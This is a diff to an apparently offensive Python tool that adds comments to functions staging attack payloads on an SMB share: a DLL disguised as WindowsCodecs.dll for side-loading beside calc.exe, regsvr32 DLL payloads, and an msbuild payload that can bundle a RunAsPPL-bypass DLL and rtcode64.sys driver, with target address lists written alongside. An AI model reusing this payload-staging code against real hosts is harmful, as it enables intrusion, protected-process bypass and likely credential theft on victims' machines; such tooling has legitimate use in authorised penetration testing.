@@ -1291,12 +1291,17 @@ def gen_payload_exe_pss(share_name, payload_name, addresses_array, drive_letter)
 
 
 def gen_payload_dllsideload_pss(share_name, addresses_array):
+    # copy calc.exe to our smb share
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
+    # allow anyone to run calc.exe
     os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
-
+    
+    # copy the dllpaylodpss to the smb share as WindowsCodecs.dll
     os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
+    # allow anyone to use it
     os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
-
+    
+    # make our address.txt file a static name since we cant compile the dllpayloads and this method does not allow us to give any input
     with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
         for addr in addresses_array:
             f.write(addr + "\n")
@@ -1304,11 +1309,15 @@ def gen_payload_dllsideload_pss(share_name, addresses_array):
 
 
 def gen_payload_regsvr32_pss(share_name, payload_name, addresses_array):
+    # make a random name for the address file
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
+    # copy the dllpaylodpss to the smb share as whatever payload_name is
     os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
+    # allow anyone to use it
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
-
+    
+    # write the addresses to addresses_file
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
         for addr in addresses_array:
             f.write(addr + "\n")
@@ -1316,13 +1325,19 @@ def gen_payload_regsvr32_pss(share_name, payload_name, addresses_array):
 
     return addresses_file
 
+
 def gen_payload_dllsideload_mdwd(share_name, addresses_array):
+    # copy calc.exe to our smb share
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
+    # allow anyone to run calc.exe
     os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
 
+    # copy the dllpaylodmdwd to the smb share as WindowsCodecs.dll
     os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
+    # allow anyone to use it
     os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
 
+    # make our address.txt file a static name since we cant compile the dllpayloads and this method does not allow us to give any input
     with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
         for addr in addresses_array:
             f.write(addr + "\n")
@@ -1330,11 +1345,15 @@ def gen_payload_dllsideload_mdwd(share_name, addresses_array):
 
 
 def gen_payload_regsvr32_mdwd(share_name, payload_name, addresses_array):
+    # make a random name for the address file
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-
+    
+    # copy the dllpaylodpss to the smb share as whatever payload_name is
     os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
+    # allow anyone to use it
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
 
+    #write the addresses_array to addresses_file in the smb share
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
         for addr in addresses_array:
             f.write(addr + "\n")
@@ -1521,7 +1540,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
             f.write(addr + "\n")
         f.close()
 
-    if runasppl:
+    if runasppl: # if we are running as runasppl copy the dll and rtcode64.sys to the smb share 
         os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
         os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))
 
